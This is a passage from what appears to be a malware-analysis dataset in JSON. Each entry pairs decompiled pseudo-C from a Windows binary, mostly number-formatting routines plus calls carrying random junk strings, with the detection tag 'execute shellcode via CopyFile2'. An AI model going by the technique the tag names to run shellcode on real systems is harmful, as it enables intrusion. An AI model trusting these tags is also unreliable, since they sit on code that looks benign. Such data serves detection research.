        "decompiled_code": "\nvoid __cdecl fcn.004042a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "004042c8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.004042c8(uint arg_8h)\n\n{\n    uint8_t uVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t iStack316;\n    uchar auStack312 [24];\n    uchar auStack288 [24];\n    int32_t iStack264;\n    uchar auStack260 [24];\n    uchar auStack236 [24];\n    int32_t iStack212;\n    uchar auStack208 [24];\n    uchar auStack184 [48];\n    uint uStack136;\n    uint uStack132;\n    uint uStack128;\n    uint uStack124;\n    uchar uStack89;\n    uint uStack88;\n    uchar uStack81;\n    uint uStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack36;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    puStack36 = &stack0xfffffea0;\n    uStack28 = 0x450820;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack44 = 0x40cc6480;\n    uStack48 = 0;\n    uStack52 = 0x40d44840;\n    uStack56 = 0;\n    uStack24 = 1;\n    fcn.00401e79(\"tvylsftrxsjadzzyznpburdavwfcdhghmsonahzmxvdzgqegyxjeckqy\");\n    uStack81 = 1;\n    uStack88 = 0xda4;\n    uStack89 = 1;\n    uStack24 = 2;\n    fcn.00401e79(\"vfnnednstucfpltoubvbbksdescbrqiwzegthvcemzswqzmzigfgsopfatemteqcliwifdygteqfhihtffqpaejmqlhdqvxijivy\")\n    ;\n    uStack124 = 0x40bf1500;\n    uStack128 = 0;\n    uStack132 = 0x409a2000;\n    uStack136 = 0;\n    uStack24 = 3;\n    fcn.00401e79(\"arzmkzzbsqpeiobxzstquyakbv\");\n    uStack24 = 4;\n    fcn.00401e79(\"tvylsftrxsjadzzyznpburdavwfcdhghmsonahzmxvdzgqegyxjeckqy\");\n    uStack24 = 7;\n    fcn.00401e79(\"tvylsftrxsjadzzyznpburdavwfcdhghmsonahzmxvdzgqegyxjeckqy\");\n    uVar1 = fcn.004042dc(auStack208, auStack184);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack212 = 0x16; 0 < iStack212; iStack212 = iStack212 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"arzmkzzbsqpeiobxzstquyakbv\");\n    uStack24 = 6;\n    fcn.00401e79(\"arzmkzzbsqpeiobxzstquyakbv\");\n    uVar1 = fcn.00405b37(auStack260, auStack236);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack264 = 0x52; 0 < iStack264; iStack264 = iStack264 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"tvylsftrxsjadzzyznpburdavwfcdhghmsonahzmxvdzgqegyxjeckqy\");\n    uStack24 = 5;\n    fcn.00401e79(\"tvylsftrxsjadzzyznpburdavwfcdhghmsonahzmxvdzgqegyxjeckqy\");\n    uVar1 = fcn.004042dc(auStack312, auStack288);\n    fcn.00403b02();\n    fcn.00403b02();\n    if ((uVar1 & 1) != 0) {\n        for (iStack316 = 0x32; 0 < iStack316; iStack316 = iStack316 + -1) {\n        }\n    }\n    uStack24 = 4;\n    fcn.00401e79(\"dybxfyc\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 1157
    },
    "00404345": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nchar __fastcall fcn.00404345(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *arg_8h;\n    uint *puVar3;\n    uint32_t var_4h;\n    \n    var_4h = param_1 & 0xffff0000;\n    *(param_1 + 0xf) = 1;\n    cVar1 = fcn.00403fee(&var_4h);\n    if (cVar1 != '\\0') {\n        cVar1 = fcn.00404331();\n        if (cVar1 != '\\0') {\n            puVar3 = param_1 + 0x10;\n            cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n            arg_8h = param_1[0x111];\n            if (cVar1 == '\\0') {\n                var_4h = var_4h & 0xffff00ff;\n                if (arg_8h == NULL) {\n                    arg_8h = puVar3;\n                }\n                iVar2 = fcn.0040105a(arg_8h, &var_4h, *(*param_1[2] + 4), param_1[2]);\n                if (iVar2 < 0) {\n                    *(param_1 + 0xc) = 1;\n                }\n            }\n            else {\n                if (arg_8h == NULL) {\n                    arg_8h = puVar3;\n                }\n                *arg_8h = var_4h;\n            }\n            if (param_1[0x111] != NULL) {\n                puVar3 = param_1[0x111];\n            }\n            param_1[0xd] = puVar3;\n            param_1[0xe] = 1;\n        }\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 446
    },
    "004043ae": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004043ae(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00402798(*(in_ECX + 0x2c));\n    var_ch = 0;\n    var_8h = 0;\n    if (var_4h == 1) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00402e7d(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00405d0d(&var_ch);\n        }\n    }\n    else if (var_4h == 2) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040540c(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00406866(&var_ch);\n        }\n    }\n    else if (var_4h == 4) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00401e24(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00405970(&var_ch);\n        }\n    }\n    else {\n        if (var_4h != 8) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.004026df(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00401578(&var_ch);\n        }\n    }\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.004059b1();\n    if (cVar1 != '\\0') {\n        uVar3 = *(in_ECX + 0x20);\n        arg_ch_00 = var_8h;\n        arg_8h_00 = var_ch;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n            uVar3 = uVar3 | 0x40;\n            *(in_ECX + 0x20) = uVar3;\n            arg_ch_00 = -(var_8h + (var_ch != 0));\n            arg_8h_00 = -var_ch;\n        }\n        if (*(in_ECX + 0x28) < 0) {\n            *(in_ECX + 0x28) = 1;\n        }\n        else {\n            *(in_ECX + 0x20) = uVar3 & 0xfffffff7;\n            fcn.004058a3(*(in_ECX + 0x28));\n        }\n        if ((arg_8h_00 | arg_ch_00) == 0) {\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n        }\n        *(in_ECX + 0x3c) = 1;\n        if (var_4h == 8) {\n            fcn.004018a7(arg_8h_00, arg_ch_00, arg_8h, arg_ch);\n        }\n        else {\n            fcn.004031a7(arg_8h_00, arg_8h, arg_ch);\n        }\n        if (((*(in_ECX + 0x20) >> 7 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (**(in_ECX + 0x34) != 0x30)))) {\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n            **(in_ECX + 0x34) = 0x30;\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1022
    },
    "004043b8": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004043b8(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 433
    },
    "00404a89": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404a89(uint *param_1)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint *puVar3;\n    uint arg_18h;\n    uint arg_14h;\n    uint arg_10h;\n    char *pcVar4;\n    uint arg_20h;\n    uint arg_24h;\n    uint noname_8;\n    uint arg_2ch;\n    uint arg_30h;\n    int32_t iVar5;\n    uint *var_8h;\n    uint *var_4h;\n    \n    param_1[8] = param_1[8] | 0x10;\n    iVar5 = param_1[10];\n    if (iVar5 < 0) {\n        if ((*(param_1 + 0x31) == 'a') || (*(param_1 + 0x31) == 'A')) {\n            iVar5 = 0xd;\n        }\n        else {\n            iVar5 = 6;\n        }\n        param_1[10] = iVar5;\n    }\n    else if ((iVar5 == 0) && ((*(param_1 + 0x31) == 'g' || (iVar5 = 0,  *(param_1 + 0x31) == 'G')))) {\n        param_1[10] = 1;\n        iVar5 = 1;\n    }\n    var_8h = param_1;\n    var_4h = param_1;\n    cVar2 = fcn.00404c50(iVar5 + 0x15d);\n    if (cVar2 == '\\0') {\n        iVar5 = fcn.004059cf();\n        param_1[10] = iVar5 + -0x15d;\n    }\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    param_1[0xd] = puVar3;\n    param_1[5] = param_1[5] + 8;\n    var_8h = *(param_1[5] + -8);\n    var_4h = *(param_1[5] + -4);\n    arg_18h = fcn.004059cf();\n    puVar3 = param_1[0x111];\n    if (param_1[0x111] == NULL) {\n        puVar3 = param_1 + 0x10;\n    }\n    iVar5 = *(param_1 + 0x31);\n    arg_30h = 1;\n    arg_2ch = param_1[2];\n    noname_8 = param_1[1];\n    arg_24h = *param_1;\n    arg_20h = param_1[10];\n    arg_14h = fcn.0040312f();\n    arg_10h = fcn.004059cf();\n    fcn.004041f6(&var_8h, puVar3, arg_10h, arg_14h, arg_18h, iVar5, arg_20h, arg_24h, noname_8, arg_2ch, arg_30h);\n    if (((param_1[8] >> 5 & 1) != 0) && (param_1[10] == 0)) {\n        fcn.004022f2(param_1[0xd], param_1[2]);\n    }\n    if (((*(param_1 + 0x31) == 'g') || (*(param_1 + 0x31) == 'G')) && ((param_1[8] >> 5 & 1) == 0)) {\n        fcn.00405bf5(param_1[0xd], param_1[2]);\n    }\n    pcVar4 = param_1[0xd];\n    cVar2 = *pcVar4;\n    if (cVar2 == '-') {\n        param_1[8] = param_1[8] | 0x40;\n        pcVar4 = pcVar4 + 1;\n        param_1[0xd] = pcVar4;\n        cVar2 = *pcVar4;\n    }\n    if (((cVar2 == 'i') || (cVar2 == 'I')) || ((cVar2 == 'n' || (cVar2 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        *(param_1 + 0x31) = 0x73;\n    }\n    pcVar1 = pcVar4 + 1;\n    do {\n        cVar2 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar2 != '\\0');\n    param_1[0xe] = pcVar4 - pcVar1;\n    return 1;\n}\n",
        "token_count": 1080
    },
    "00404b92": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404b92(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    char *pcVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402798(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004037ce();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a538b;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a538b;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a538b:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.00404c50(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 0;\n    if (iVar1 == 8) {\n        fcn.004043b8(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00403e77(uVar3, arg_8h, arg_ch);\n    }\n    pcVar4 = *(in_ECX + 0x20) >> 7;\n    if (((pcVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (pcVar4 = *(in_ECX + 0x34),  *pcVar4 != '0')))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(pcVar4 >> 8, 1);\n}\n",
        "token_count": 1115
    },
    "00404c41": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00404c41(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402798(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.00403a35();\n                *puVar2 = 0x16;\n                uVar3 = fcn.004037ce();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a5a5b;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a5a5b;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a5a5b:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.004058a3(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 1;\n    if (iVar1 == 8) {\n        fcn.00406226(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.00403fb7(uVar3, arg_8h, arg_ch);\n    }\n    piVar4 = *(in_ECX + 0x20) >> 7;\n    if (((piVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (piVar4 = *(in_ECX + 0x34),  *piVar4 != 0x30)))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 1123
    },
    "00404c73": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00404c73(uint *param_1)\n\n{\n    char cVar1;\n    uint32_t arg_14h;\n    uint arg_10h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint arg_18h;\n    \n    puVar4 = param_1 + 0x10;\n    cVar1 = fcn.004047f5(*param_1, param_1[1], *(param_1 + 0x31), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        param_1[5] = param_1[5] + 4;\n        *puVar3 = *(param_1[5] + -4);\n        param_1[0xe] = 1;\n    }\n    else {\n        param_1[5] = param_1[5] + 4;\n        arg_14h = *(param_1[5] + -4);\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        arg_18h = param_1[2];\n        arg_10h = fcn.004059cf();\n        iVar2 = fcn.00401f78(param_1 + 0xe, puVar3, arg_10h, arg_14h, arg_18h);\n        if (iVar2 != 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 453
    },
    "00404f25": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00404f25(uint *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint *var_4h;\n    \n    param_1[5] = param_1[5] + 4;\n    puVar4 = param_1 + 0x10;\n    *(param_1 + 0xf) = 1;\n    var_4h._0_2_ = *(param_1[5] + -4);\n    var_4h = param_1;\n    cVar1 = fcn.00401893(*param_1, param_1[1], *(param_1 + 0x32), param_1[0xb]);\n    if (cVar1 == '\\0') {\n        var_4h._0_2_ = var_4h & 0xff;\n        var_4h = var_4h & 0xffff0000 | var_4h;\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        iVar2 = fcn.0040105a(puVar3, &var_4h, *(*param_1[2] + 4), param_1[2]);\n        if (iVar2 < 0) {\n            *(param_1 + 0xc) = 1;\n        }\n    }\n    else {\n        puVar3 = param_1[0x111];\n        if (param_1[0x111] == NULL) {\n            puVar3 = puVar4;\n        }\n        *puVar3 = var_4h;\n    }\n    puVar3 = param_1[0x111];\n    if (puVar3 != NULL) {\n        puVar4 = puVar3;\n    }\n    param_1[0xd] = puVar4;\n    param_1[0xe] = 1;\n    return CONCAT31(puVar3 >> 8, 1);\n}\n",
        "token_count": 470
    },
    "00404f34": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00404f34(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar2 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar2 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.00403b57();\n    iVar1 = iVar2 + iVar1 * 2 + -2;\n    *(in_ECX + 0x34) = iVar1;\n    iVar2 = iVar1;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        uVar3 = extraout_ECX + 0x30U & 0xffff;\n        if (0x39 < uVar3) {\n            uVar3 = (arg_14h ^ 1) * ' ' + '\\a' + uVar3;\n        }\n        **(in_ECX + 0x34) = uVar3;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        iVar2 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar1 - iVar2 >> 1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 2;\n    return;\n}\n",
        "token_count": 455
    },
    "00405001": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738",
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n\nuint __cdecl fcn.00405001(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x450ee0;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"qneyyqokgou\");\n    uStack24 = 1;\n    fcn.00401e79(\"nbnsszoyjxecqowlgtutndpzejjcyiqudtsdsxfeitqckropqgtmesvrttmnbbsye\");\n    uStack24 = 2;\n    fcn.00401e79(\"fkfxtmczvbharvphgftchjhudlqgplxiccnwnwklvfsltizloaaqopbnfrmqttibnzmjowvminozvyfihmxajpbrbbtfht\");\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return 1;\n}\n",
        "token_count": 298
    },
    "00405092": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405092(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    char extraout_CL;\n    char cVar2;\n    int32_t in_ECX;\n    int32_t iVar3;\n    int64_t iVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar4 = CONCAT44(arg_ch, arg_8h);\n    iVar3 = *(in_ECX + 0x444);\n    if (*(in_ECX + 0x444) == 0) {\n        iVar3 = in_ECX + 0x40;\n    }\n    iVar1 = fcn.004059cf();\n    iVar3 = iVar3 + iVar1 + -1;\n    *(in_ECX + 0x34) = iVar3;\n    iVar1 = iVar3;\n    while ((0 < *(in_ECX + 0x28) || (iVar4 != 0))) {\n        *(in_ECX + 0x28) = *(in_ECX + 0x28) + -1;\n        iVar4 = fcn.00401820(iVar4, arg_10h, 0, iVar4 >> 0x20);\n        cVar2 = extraout_CL + '0';\n        if ('9' < cVar2) {\n            cVar2 = cVar2 + (arg_14h ^ 1) * ' ' + '\\a';\n        }\n        **(in_ECX + 0x34) = cVar2;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n        iVar1 = *(in_ECX + 0x34);\n    }\n    *(in_ECX + 0x38) = iVar3 - iVar1;\n    *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    return;\n}\n",
        "token_count": 432
    },
    "0040509c": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
